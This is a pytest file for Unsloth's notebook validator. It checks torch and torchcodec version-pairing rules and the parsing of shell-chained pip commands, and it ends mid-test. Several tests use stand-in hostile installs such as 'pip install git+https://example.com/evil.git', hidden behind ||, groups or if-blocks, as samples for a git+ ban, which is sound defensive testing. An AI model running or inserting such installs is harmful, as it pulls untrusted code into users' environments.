# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team.
"""torch / torchcodec ABI guardrails (unslothai/unsloth#7225)."""

from __future__ import annotations
import argparse
import importlib.util
import json
import re
import sys
import types
from pathlib import Path
import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
PYPROJECT = REPO_ROOT / "pyproject.toml"
IMPORT_FIXES_PATH = REPO_ROOT / "unsloth" / "import_fixes.py"
EXTRAS_NO_DEPS_TXT = REPO_ROOT / "studio" / "backend" / "requirements" / "extras-no-deps.txt"
SECURITY_AUDIT_YML = REPO_ROOT / ".github" / "workflows" / "security-audit.yml"
COLAB_TORCH211 = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
TORCHCODEC_WHEEL = (
    "https://download.pytorch.org/whl/torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl"
)


def _load_notebook_validator_module():
    """Load by path: `from scripts import ...` picks up whatever `scripts`
    package happens to be on sys.path first, which is not always this repo's."""
    spec = importlib.util.spec_from_file_location(
        "unsloth_notebook_validator_under_test",
        REPO_ROOT / "scripts" / "notebook_validator.py",
    )
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    # dataclasses resolves annotations through sys.modules: register before executing.
    sys.modules[spec.name] = mod
    try:
        spec.loader.exec_module(mod)
    except Exception:
        sys.modules.pop(spec.name, None)
        raise
    return mod


def test_notebook_validator_rejects_legacy_codec_past_last_lockstep_row():
    """The mirrored notebook rule must flag the same pairing as import_fixes."""
    nv = _load_notebook_validator_module()

    cell = '!pip install --no-deps "torch==2.12.1" "torchcodec==0.11.1"'
    findings = nv.rule_inst_004_torchcodec_torch(cell, {}, "nb.ipynb", 0)
    assert len(findings) == 1
    assert findings[0].rule == "R-INST-004"
    assert findings[0].severity == "error"
    assert "torchcodec>=0.12.0" in findings[0].hint

    old = '!pip install --no-deps "torch==2.4.0" "torchcodec==0.0.3"'
    assert nv.rule_inst_004_torchcodec_torch(old, {}, "nb.ipynb", 0) == []


def test_notebook_validator_allows_abi_stable_pairing():
    """R-INST-004 is an error-severity rule: it must not fire on torch 2.11 + 0.12+."""
    nv = _load_notebook_validator_module()

    cell = '!pip install --no-deps "torch==2.11.0" "torchcodec==0.15.0"'
    assert nv.rule_inst_004_torchcodec_torch(cell, {}, "nb.ipynb", 0) == []

    stale = '!pip install --no-deps "torch==2.11.0" "torchcodec==0.10.0"'
    findings = nv.rule_inst_004_torchcodec_torch(stale, {}, "nb.ipynb", 0)
    assert len(findings) == 1
    assert findings[0].rule == "R-INST-004"


def test_notebook_validator_accepts_its_own_torchcodec_remedy():
    """The hint is a `>=` pin and resolved_set() drops `>=`, so following it changed nothing."""
    nv = _load_notebook_validator_module()

    broken = '!pip install "torch==2.12.0"'
    assert nv.rule_inst_004_torchcodec_torch(broken, COLAB_TORCH211, "nb.ipynb", 0)

    fixed = '!pip install "torch==2.12.0" "torchcodec>=0.12.0"'
    assert nv.rule_inst_004_torchcodec_torch(fixed, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_reads_torch_range_pins():
    """A `torch>=` floor above Colab's torch moves pip while torchcodec stays put."""
    nv = _load_notebook_validator_module()

    ranged = '!pip install "torch>=2.12"'
    findings = nv.rule_inst_004_torchcodec_torch(ranged, COLAB_TORCH211, "nb.ipynb", 0)
    assert len(findings) == 1
    assert "torchcodec>=0.12.0" in findings[0].hint


def test_notebook_validator_ignores_lower_bounds_under_the_resolved_version():
    """A floor below the installed version changes nothing, so it must not be flagged."""
    nv = _load_notebook_validator_module()

    for cell in ('!pip install "torchcodec>=0.10"', '!pip install "torch>=2.9"'):
        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], cell


def test_notebook_validator_reads_the_bounds_in_invocation_order():
    """Whichever bound runs last is the one pip leaves behind, in both directions."""
    nv = _load_notebook_validator_module()

    downgraded = (
        '!pip install "torch==2.12.0" "torchcodec>=0.12"\n'
        '!pip install --no-deps "torchcodec==0.11.1"'
    )
    findings = nv.rule_inst_004_torchcodec_torch(downgraded, COLAB_TORCH211, "nb.ipynb", 0)
    assert len(findings) == 1, "a later exact pin must win over an earlier floor"
    assert "torchcodec==0.11.1" in findings[0].message

    upgraded = '!pip install "torch==2.12.0" "torchcodec==0.11.1"\n!pip install "torchcodec>=0.12"'
    assert nv.rule_inst_004_torchcodec_torch(upgraded, COLAB_TORCH211, "nb.ipynb", 0) == []

    # The reported torch must be the one the notebook ends on, not the discarded floor.
    retreated = '!pip install "torch>=2.12"\n!pip install "torch==2.10.0"'
    findings = nv.rule_inst_004_torchcodec_torch(retreated, COLAB_TORCH211, "nb.ipynb", 0)
    assert len(findings) == 1
    assert "torch==2.10.0" in findings[0].message

    # `<=` closes the same gap as `==`, and only downwards.
    capped = '!pip install "torch==2.12.0" "torchcodec>=0.12"\n!pip install "torchcodec<=0.11"'
    assert len(nv.rule_inst_004_torchcodec_torch(capped, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    lifted = '!pip install "torch==2.12.0" "torchcodec<=0.11"\n!pip install "torchcodec>=0.12"'
    assert nv.rule_inst_004_torchcodec_torch(lifted, COLAB_TORCH211, "nb.ipynb", 0) == []

    # A one-line range is not a downgrade: the floor still decides.
    ranged = '!pip install "torch==2.12.0" "torchcodec>=0.12,<=0.13"'
    assert nv.rule_inst_004_torchcodec_torch(ranged, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_honours_a_torchcodec_uninstall():
    """Removing the codec answers the mismatch, so the post-2.11 branch must not report one.
    parse_pip_line drops the action word, so without it an uninstall reads as an install."""
    nv = _load_notebook_validator_module()

    removed = '!pip uninstall -y torchcodec\n!pip install "torch==2.12.0"'
    assert nv.rule_inst_004_torchcodec_torch(removed, COLAB_TORCH211, "nb.ipynb", 0) == []

    # Put back incompatibly and it is a finding again; put back compatibly and it is not.
    back_stale = (
        "!pip uninstall -y torchcodec\n" '!pip install "torch==2.12.0" "torchcodec==0.11.1"'
    )
    assert len(nv.rule_inst_004_torchcodec_torch(back_stale, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    back_ok = "!pip uninstall -y torchcodec\n" '!pip install "torch==2.12.0" "torchcodec==0.13.0"'
    assert nv.rule_inst_004_torchcodec_torch(back_ok, COLAB_TORCH211, "nb.ipynb", 0) == []

    # Uninstalling after a good install still leaves nothing to flag.
    dropped = '!pip install "torch==2.12.0" "torchcodec==0.13.0"\n!pip uninstall -y torchcodec'
    assert nv.rule_inst_004_torchcodec_torch(dropped, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_keeps_an_absent_package_unknown():
    """Only `==` names a version: a floor on an absent package resolves to the newest release
    satisfying it, so the pairing stays unknown rather than being pinned to the floor."""
    nv = _load_notebook_validator_module()

    reinstalled = '!pip uninstall -y torchcodec\n!pip install "torchcodec>=0.10"'
    assert nv.rule_inst_004_torchcodec_torch(reinstalled, COLAB_TORCH211, "nb.ipynb", 0) == []

    # Same when nothing supplies a baseline at all (a non-Colab notebook).
    floor_only = '!pip install "torch==2.11.0" "torchcodec>=0.10"'
    assert nv.rule_inst_004_torchcodec_torch(floor_only, {}, "nb.ipynb", 0) == []

    # An exact pin still names one, with or without a baseline.
    exact = '!pip install --no-deps "torch==2.12.1" "torchcodec==0.11.1"'
    assert len(nv.rule_inst_004_torchcodec_torch(exact, {}, "nb.ipynb", 0)) == 1


def test_notebook_validator_splits_chained_shell_commands():
    """`pip uninstall x && pip install x==V` is two actions on one line. Read as one, the
    reinstall lands in the uninstall's package list and the pairing disappears."""
    nv = _load_notebook_validator_module()

    invocations = list(
        nv.iter_pip_invocations('!pip uninstall -y torchcodec && pip install "torchcodec==0.11.1"')
    )
    assert [inv.action for inv in invocations] == ["uninstall", "install"]
    assert [inv.packages for inv in invocations] == [["torchcodec"], ["torchcodec==0.11.1"]]

    for sep in ("&&", ";"):
        cell = (
            f'!pip uninstall -y torchcodec {sep} pip install "torchcodec==0.11.1"\n'
            '!pip install "torch==2.12.0"'
        )
        assert len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1, sep

    healed = (
        '!pip uninstall -y torchcodec && pip install "torchcodec==0.13.0"\n'
        '!pip install "torch==2.12.0"'
    )
    assert nv.rule_inst_004_torchcodec_torch(healed, COLAB_TORCH211, "nb.ipynb", 0) == []

    # A `;` inside a PEP 508 marker is one argument, not a separator.
    marked = "!pip install \"torch==2.12.0; python_version >= '3.10'\""
    assert nv._split_chained(marked) == [(marked, False)]
    assert len(nv.rule_inst_004_torchcodec_torch(marked, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_skips_the_fallback_side_of_an_or_chain():
    """`A || B` runs B only when A failed, so replaying both reports a codec the notebook
    does not have. The left side still counts."""
    nv = _load_notebook_validator_module()

    fallback = (
        '!pip install "torchcodec==0.13.0" || pip install "torchcodec==0.11.1"\n'
        '!pip install "torch==2.12.0"'
    )
    assert nv.rule_inst_004_torchcodec_torch(fallback, COLAB_TORCH211, "nb.ipynb", 0) == []

    primary = (
        '!pip install "torchcodec==0.11.1" || pip install "torchcodec==0.13.0"\n'
        '!pip install "torch==2.12.0"'
    )
    assert len(nv.rule_inst_004_torchcodec_torch(primary, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_reads_compatible_release_pins():
    """`~=2.12.0` implies `>=2.12.0`, so its floor moves the baseline up."""
    nv = _load_notebook_validator_module()

    upgraded = '!pip install "torch~=2.12.0"'
    findings = nv.rule_inst_004_torchcodec_torch(upgraded, COLAB_TORCH211, "nb.ipynb", 0)
    assert len(findings) == 1
    assert "torchcodec>=0.12.0" in findings[0].hint

    remedied = '!pip install "torch==2.12.0" "torchcodec~=0.13.0"'
    assert nv.rule_inst_004_torchcodec_torch(remedied, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_stops_at_a_shell_comment():
    """An unquoted `#` comments out the rest of the line, so a `;` inside it is not a
    separator and the commented-out install must not be replayed."""
    nv = _load_notebook_validator_module()

    cell = '!pip install "torch==2.12.0" # keep codec; pip install "torchcodec==0.13.0"'
    assert nv._split_chained(cell) == [('!pip install "torch==2.12.0"', False)]
    assert len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    # A control operator ends a word, so `;#` opens a comment with no space in front of it.
    tight = '!pip install "torch==2.12.0";# keep codec; pip install "torchcodec==0.13.0"'
    assert nv._split_chained(tight) == [('!pip install "torch==2.12.0"', False)]
    assert len(nv.rule_inst_004_torchcodec_torch(tight, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    # A `#` inside a word is not a comment: it is part of the argument.
    fragment = '!pip install "torchcodec==0.13.0#egg=x"'
    assert nv._split_chained(fragment) == [(fragment, False)]


def test_notebook_validator_resumes_after_an_or_list():
    """`A || B; C` runs C whatever A did. Only the conditional tail is dropped, and a `;`
    ends it."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained(
        "!pip install a && pip install b || pip install c ; pip install d"
    ) == [
        ("!pip install a", False),
        ("!pip install b", False),
        ("!pip install c", True),
        ("!pip install d", False),
    ]

    cell = '!pip install "torchcodec==0.11.1" || echo failed; pip install "torch==2.12.0"'
    assert len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_respects_escaped_separators():
    """A backslash-escaped `;` is part of the argument, the way shlex reads it in
    parse_pip_line. Split on it and the fragment ends in a backslash and parses as nothing."""
    nv = _load_notebook_validator_module()

    escaped = "!pip install torch==2.12.0\\;\\ python_version\\ \\>\\=\\ \\'3.10\\'"
    assert nv._split_chained(escaped) == [(escaped, False)]
    assert [inv.packages for inv in nv.iter_pip_invocations(escaped)] == [
        ["torch==2.12.0; python_version >= '3.10'"]
    ]
    assert len(nv.rule_inst_004_torchcodec_torch(escaped, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_merges_repeated_requirements_in_one_command():
    """pip intersects a project named twice in one command, so the bounds are one window.
    Applied one argument at a time the floor lands first and the ceiling then clears it."""
    nv = _load_notebook_validator_module()

    split_window = '!pip install "torchcodec>=0.10" "torchcodec<0.11"'
    findings = nv.rule_inst_004_torchcodec_torch(split_window, COLAB_TORCH211, "nb.ipynb", 0)
    assert len(findings) == 1
    assert "torchcodec==0.10" in findings[0].message

    # Same answer as the comma spelling, which is the point.
    comma = '!pip install "torchcodec>=0.10,<0.11"'
    assert nv.rule_inst_004_torchcodec_torch(comma, COLAB_TORCH211, "nb.ipynb", 0) == findings

    # A window the baseline already sits in is still a no-op.
    wide = '!pip install "torchcodec>=0.10" "torchcodec<0.12"'
    assert nv.rule_inst_004_torchcodec_torch(wide, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_resumes_after_an_and_following_an_or():
    """And-or lists are left-associative: in `A || B && C`, C runs when A succeeded, so the
    conditional tail ends at the `&&`."""
    nv = _load_notebook_validator_module()

    assert nv._split_chained("!pip install a || pip install b && pip install c") == [
        ("!pip install a", False),
        ("!pip install b", True),
        ("!pip install c", False),
    ]

    cell = '!pip install "torchcodec==0.11.1" || echo failed && pip install "torch==2.12.0"'
    assert len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_will_not_name_a_multi_minor_window():
    """Moving down lands on the newest release the window admits, which the floor only names
    when there is one minor to land in."""
    nv = _load_notebook_validator_module()

    assert nv._window_names_one_minor("0.10", "0.11")
    assert not nv._window_names_one_minor("0.10", "0.12")

    # pip picks 0.11 here, which torch 2.11 is fine with, so nothing is reported.
    spanning = '!pip install "torchcodec==0.15"\n!pip install "torchcodec>=0.10,<0.12"'
    assert nv.rule_inst_004_torchcodec_torch(spanning, COLAB_TORCH211, "nb.ipynb", 0) == []

    # One minor still names its floor.
    single = '!pip install "torchcodec>=0.10,<0.11"'
    assert len(nv.rule_inst_004_torchcodec_torch(single, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_reads_a_direct_wheel_install():
    """pip takes an archive URL as an install target and parse_spec skips it, so a wheel that
    replaces the codec used to read as no install at all."""
    nv = _load_notebook_validator_module()

    assert nv._archive_requirement(TORCHCODEC_WHEEL) == ("torchcodec", "0.13.0")
    assert nv._archive_requirement("torchcodec==0.13.0") is None
    assert nv._archive_requirement("git+https://github.com/meta-pytorch/torchcodec.git") is None
    # A URL spells the local tag percent-encoded.
    assert nv._archive_requirement(
        "https://x/torch-2.12.0%2Bcu130-cp312-cp312-linux_x86_64.whl"
    ) == ("torch", "2.12.0+cu130")

    compatible = f'!pip install "torch==2.12.0" {TORCHCODEC_WHEEL}'
    assert nv.rule_inst_004_torchcodec_torch(compatible, COLAB_TORCH211, "nb.ipynb", 0) == []

    stale = compatible.replace("0.13.0", "0.10.0").replace("torch==2.12.0", "torch==2.11.0")
    assert len(nv.rule_inst_004_torchcodec_torch(stale, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_replays_exclusions():
    """`!=` rules out what is installed, so keeping it reports a version pip cannot leave in
    place. Without a floor to fall back on the pairing is unknown, not stale."""
    nv = _load_notebook_validator_module()

    assert nv._version_is_excluded("0.11.0+cu128", "0.11.*")
    assert nv._version_is_excluded("0.11.0", "0.11.0")
    assert not nv._version_is_excluded("0.11.0", "0.9.*")

    for pin in ("torchcodec!=0.11.*", "torchcodec!=0.11.0"):
        cell = f'!pip install "torch==2.12.0" "{pin}"'
        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], pin

    # An exclusion that does not match leaves the baseline, and the pairing, alone.
    untouched = '!pip install "torch==2.12.0" "torchcodec!=0.9.*"'
    assert len(nv.rule_inst_004_torchcodec_torch(untouched, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    # What is left after the exclusion spans minors, so the floor does not name it either.
    broad = '!pip install "torch==2.12.0" "torchcodec>=0.9,!=0.11.*"'
    assert nv.rule_inst_004_torchcodec_torch(broad, COLAB_TORCH211, "nb.ipynb", 0) == []

    # One minor left over still names its floor.
    narrow = '!pip install "torch==2.11.0" "torchcodec>=0.10,<0.11,!=0.11.*"'
    assert len(nv.rule_inst_004_torchcodec_torch(narrow, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_keeps_or_fallbacks_visible_to_other_rules():
    """The fallback still runs when the left side fails, so dropping it from
    iter_pip_invocations hid it from R-INST-001's git+ ban. Only the version replay skips it."""
    nv = _load_notebook_validator_module()

    cell = "!pip install foo || pip install git+https://example.com/evil.git"
    assert [inv.conditional for inv in nv.iter_pip_invocations(cell)] == [False, True]
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0))

    # The replay still ignores it, so the fallback codec is not reported as installed.
    fallback = (
        '!pip install "torchcodec==0.13.0" || pip install "torchcodec==0.11.1"\n'
        '!pip install "torch==2.12.0"'
    )
    assert nv.rule_inst_004_torchcodec_torch(fallback, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_will_not_name_an_exclusive_floor():
    """`>V` says the install moved but not where; only a ceiling pinning the minor does. The
    bound is KEPT as inexact, for the checks that hold over the whole admitted range."""
    nv = _load_notebook_validator_module()

    for cell in ('!pip install "torch>2.12"', '!pip install "torch>2.11.999"'):
        version, exact = nv._effective_version(cell, "torch", "2.11.0+cu128")
        assert exact is False, cell  # never read as the version pip landed on
        assert version is not None, cell
    # Above 2.12 nothing pairs with the image's codec 0.11, which holds for every release the
    # bound admits, so the finding does not depend on naming one.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch>2.12"', COLAB_TORCH211, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]
    # 2.11.999 still admits the 2.11 line the image's codec pairs with, so nothing is proven.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch>2.11.999"', COLAB_TORCH211, "nb.ipynb", 0
        )
        == []
    )

    # `>=` still names its endpoint, which is what the earlier rounds rest on.
    assert nv._effective_version('!pip install "torch>=2.12"', "torch", "2.11.0+cu128") == (
        "2.12",
        False,
    )
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!pip install "torch>=2.12"', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )


def test_notebook_validator_treats_an_open_floor_as_a_floor():
    """pip takes the newest release above an open `>=`, so the floor bounds rather than answers.
    Enough for the ABI check, where everything above it agrees, and not for the table."""
    nv = _load_notebook_validator_module()

    old_pair = {"torch": "2.9.0+cu128", "torchcodec": "0.7.0+cu128"}

    # 0.8 is in the torch 2.9 row, but `>=0.8` can just as easily land on 0.16, so nothing is
    # proven either way and the rule stays quiet.
    assert (
        nv.rule_inst_004_torchcodec_torch('!pip install "torchcodec>=0.8"', old_pair, "nb.ipynb", 0)
        == []
    )

    # Every release above this floor is outside the torch 2.10 row, so it is provable.
    absent = {"torch": "2.10.0+cu128"}
    findings = nv.rule_inst_004_torchcodec_torch(
        '!pip install "torch==2.10.0" "torchcodec>=0.12.0"', absent, "nb.ipynb", 0
    )
    assert len(findings) == 1

    # An exact pin in the row is still accepted, and one outside it still reported.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torchcodec==0.8.0"', old_pair, "nb.ipynb", 0
        )
        == []
    )
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!pip install "torchcodec==0.11.0"', old_pair, "nb.ipynb", 0
            )
        )
        == 1
    )


def test_notebook_validator_ignores_a_conditional_pin_when_seeding():
    """resolved_set seeds the replay, so it has to skip the `||` fallback as well or the
    conditional pin comes back in through the seed."""
    nv = _load_notebook_validator_module()

    cell = '!pip install foo || pip install "torch==2.12.0"'
    assert nv.resolved_set(cell, COLAB_TORCH211)["torch"] == "2.11.0+cu128"
    assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_pads_release_segments_when_excluding():
    """PEP 440 pads the release segment, so `!=0.11` rules out an installed `0.11.0`."""
    nv = _load_notebook_validator_module()

    assert nv._version_is_excluded("0.11.0+cu128", "0.11")
    assert nv._version_is_excluded("0.11", "0.11.0")
    assert not nv._version_is_excluded("0.11.1", "0.11")

    cell = '!pip install "torch==2.12" "torchcodec!=0.11"'
    assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_unwraps_shell_groups():
    """A grouped command still runs, so leaving the bracket on it hides it from PIP_LINE_RE
    and with it from R-INST-001's git+ ban."""
    nv = _load_notebook_validator_module()

    for evil in (
        "!pip install foo || (pip install git+https://example.com/evil.git)",
        "!pip install foo || { pip install git+https://example.com/evil.git; }",
        "!(pip install git+https://example.com/evil.git)",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
        ), evil

    assert nv._unwrap_shell_group("!( pip install x )") == ("!pip install x", False)
    assert nv._unwrap_shell_group("{ pip install x") == ("pip install x", False)
    assert nv._unwrap_shell_group("}") == ("", False)
    assert nv._unwrap_shell_group("then pip install x") == ("pip install x", True)
    # `if pip install ...` is the test, which runs whenever the line is reached.
    assert nv._unwrap_shell_group("if pip install x") == ("pip install x", False)


def test_notebook_validator_skips_conditional_invocations_in_rule_002(monkeypatch):
    """resolved_set drops a fallback's pins, so a rule reading both has to drop the
    invocation as well or it checks that install against an environment it never made."""
    nv = _load_notebook_validator_module()
    monkeypatch.setattr(
        nv,
        "pypi_metadata",
        lambda name, version: {"info": {"requires_dist": ["tokenizers (>=0.30.0)"]}}
        if name.lower() == "transformers"
        else None,
    )
    colab = {"transformers": "5.0.0", "tokenizers": "0.22.2"}

    # Unconditional, so the mismatch against Colab's tokenizers is real and reported.
    plain = '!pip install --no-deps "transformers==5.5.0"'
    assert [f.rule for f in nv.rule_inst_002_no_deps_transitive(plain, colab, "nb.ipynb", 0)] == [
        "R-INST-002"
    ]

    # Behind an `||`, its pins never reach resolved_set, so checking it compares against an
    # environment this branch did not build.
    fallback = '!pip install foo || pip install --no-deps "transformers==5.5.0"'
    assert [inv.conditional for inv in nv.iter_pip_invocations(fallback)] == [False, True]
    assert nv.rule_inst_002_no_deps_transitive(fallback, colab, "nb.ipynb", 0) == []


def test_notebook_validator_bounds_the_minor_with_an_inclusive_cap():
    """`>=0.10,<=0.10.5` admits only the 0.10 line, so the window names it just as
    `>=0.10,<0.11` does."""
    nv = _load_notebook_validator_module()

    assert nv._window_names_one_minor("0.10", None, "0.10.5")
    assert not nv._window_names_one_minor("0.10", None, "0.11")

    older = {"torch": "2.11.0+cu128", "torchcodec": "0.9.0+cu128"}
    findings = nv.rule_inst_004_torchcodec_torch(
        '!pip install "torchcodec>=0.10,<=0.10.5"', older, "nb.ipynb", 0
    )
    assert len(findings) == 1
    assert "torchcodec==0.10" in findings[0].message

    # A cap that reaches into the next minor still cannot name where it lands.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torchcodec>=0.10,<=0.11"', older, "nb.ipynb", 0
        )
        == []
    )


def test_notebook_validator_applies_exclusions_to_where_it_landed():
    """An exclusion has to hold for the version the requirement leaves in place, not only for
    the one that was there before it ran."""
    nv = _load_notebook_validator_module()

    newer = {"torch": "2.10.0+cu128", "torchcodec": "0.15.0"}
    # The cap says 0.11, the exclusion rules that whole line out, and pip lands below it, so
    # recording the cap reported a 0.11 codec where a 0.10 the row allows is what installs.
    capped = '!pip install "torchcodec==0.15"\n!pip install "torchcodec<=0.11,!=0.11.*"'
    assert nv.rule_inst_004_torchcodec_torch(capped, newer, "nb.ipynb", 0) == []

    # A window that still names a minor after the exclusion keeps naming it.
    findings = nv.rule_inst_004_torchcodec_torch(
        '!pip install "torchcodec>=0.10,<0.11,!=0.11.*"',
        {"torch": "2.11.0+cu128", "torchcodec": "0.15.0"},
        "nb.ipynb",
        0,
    )
    assert len(findings) == 1
    assert "torchcodec==0.10" in findings[0].message


def test_notebook_validator_skips_conditional_invocations_in_rule_003():
    """The torchao floor helper reads the same cell, so a fallback that never runs must not
    satisfy the floor R-INST-003 is checking."""
    nv = _load_notebook_validator_module()

    colab = {"peft": "0.19.1", "torchao": "0.15.0"}
    assert (
        nv._install_cell_lower_bound('!pip install foo || pip install "torchao>=0.16.0"', "torchao")
        is None
    )
    assert [
        f.rule
        for f in nv.rule_inst_003_peft_torchao(
            '!pip install foo || pip install "torchao>=0.16.0"', colab, "nb.ipynb", 0
        )
    ] == ["R-INST-003"]

    # Run unconditionally and it does satisfy the floor.
    assert (
        nv.rule_inst_003_peft_torchao('!pip install "torchao>=0.16.0"', colab, "nb.ipynb", 0) == []
    )


def test_notebook_validator_moves_off_an_exclusive_endpoint():
    """`>V` is not satisfied by V, so an installed version sitting exactly on the endpoint
    still has to be replaced."""
    nv = _load_notebook_validator_module()

    on_the_endpoint = {"torch": "2.11.0+cu128", "torchcodec": "0.8.0"}
    # Inexact: the bound survives so range checks can run, but it never reads as the landing.
    assert nv._effective_version('!pip install "torchcodec>0.8.0"', "torchcodec", "0.8.0") == (
        "0.8.0",
        False,
    )
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torchcodec>0.8.0"', on_the_endpoint, "nb.ipynb", 0
        )
        == []
    )

    # `>=` is satisfied by it, and a lower `>` leaves it alone, so both still report the
    # 0.8 codec against the torch 2.11 row.
    for cell in ('!pip install "torchcodec>=0.8.0"', '!pip install "torchcodec>0.7.0"'):
        assert (
            len(nv.rule_inst_004_torchcodec_torch(cell, on_the_endpoint, "nb.ipynb", 0)) == 1
        ), cell


def test_every_rule_reads_the_filtered_invocations():
    """Every reader asks what the cell leaves installed and takes the filtered iterator.
    R-INST-001 asks what could run at all, and answers it from whole lines instead."""
    nv = _load_notebook_validator_module()

    cell = "!pip install foo || pip install --no-deps git+https://example.com/evil.git"
    assert [inv.packages for inv in nv.unconditional_pip_invocations(cell)] == [["foo"]]
    assert len(list(nv.iter_pip_invocations(cell))) == 2

    # The ban reads whole lines, so no shell construct can put a git+ source out of reach.
    for evil in (
        cell,
        "!pip install foo || (pip install git+https://example.com/evil.git)",
        "!pip install foo || if command -v uv; then pip install git+https://example.com/evil.git; fi",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
        ), evil

    # Still line-scoped: the allowlist holds, and a line with no pip command is not an install.
    assert (
        nv.rule_inst_001_git_plus(
            "!pip install git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
        )
        == []
    )
    assert nv.rule_inst_001_git_plus('x = "git+https://example.com/evil.git"', "nb.ipynb", 0) == []

    source = (REPO_ROOT / "scripts" / "notebook_validator.py").read_text(encoding = "utf-8")
    assert (
        source.count("in iter_pip_invocations(install_cell)") == 1
    ), "only unconditional_pip_invocations may read the raw iterator; rules take the filtered one"


def test_notebook_validator_keeps_a_group_conditional_throughout():
    """An `&&` or `;` inside a `(` or `{` group belongs to the group, so it does not end the
    fallback: if the left side succeeded, nothing in the group runs."""
    nv = _load_notebook_validator_module()

    for grouped in (
        '!pip install foo || (pip install bar && pip install "torch==2.12.0")',
        '!pip install foo || (pip install bar ; pip install "torch==2.12.0")',
    ):
        assert [flag for _, flag in nv._split_chained(grouped)] == [False, True, True], grouped
        assert (
            nv.rule_inst_004_torchcodec_torch(grouped, COLAB_TORCH211, "nb.ipynb", 0) == []
        ), grouped

    # Outside a group, and after one closes, the operator still ends the tail.
    for ungrouped in (
        '!pip install foo || pip install bar && pip install "torch==2.12.0"',
        '!pip install foo || (pip install bar) && pip install "torch==2.12.0"',
    ):
        assert [flag for _, flag in nv._split_chained(ungrouped)] == [False, True, False], ungrouped
        assert (
            len(nv.rule_inst_004_torchcodec_torch(ungrouped, COLAB_TORCH211, "nb.ipynb", 0)) == 1
        ), ungrouped

    # The git+ ban still sees inside the group, conditional or not.
    evil = "!pip install foo || (pip install bar && pip install git+https://example.com/evil.git)"
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0))


def test_notebook_validator_pads_the_minor_boundary():
    """`<0.11.0` and `<0.11` name the same boundary, so both windows hold one minor."""
    nv = _load_notebook_validator_module()

    assert nv.cmp_releases("0.11.0", "0.11") == 0
    assert nv.cmp_releases("0.11.1", "0.11") == 1
    assert nv._window_names_one_minor("0.10", "0.11.0")

    for cell in (
        '!pip install "torchcodec>=0.10,<0.11.0"',
        '!pip install "torchcodec>=0.10,<0.11"',
    ):
        assert (
            len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1
        ), cell

    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torchcodec>=0.10,<0.12"', COLAB_TORCH211, "nb.ipynb", 0
        )
        == []
    )


def test_notebook_validator_reads_an_archive_given_as_a_path():
    """`./torchcodec-0.13.0-...whl` parses as a project called `.`, so checking parse_spec
    first hid the wheel behind a name that never matches."""
    nv = _load_notebook_validator_module()

    for path in (
        "./torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl",
        "torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl",
        "/tmp/torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl",
    ):
        assert nv._archive_requirement(path) == ("torchcodec", "0.13.0"), path
        assert (
            nv.rule_inst_004_torchcodec_torch(
                f'!pip install "torch==2.12.0" {path}', COLAB_TORCH211, "nb.ipynb", 0
            )
            == []
        ), path

    stale = "./torchcodec-0.10.0-cp312-cp312-manylinux_2_28_x86_64.whl"
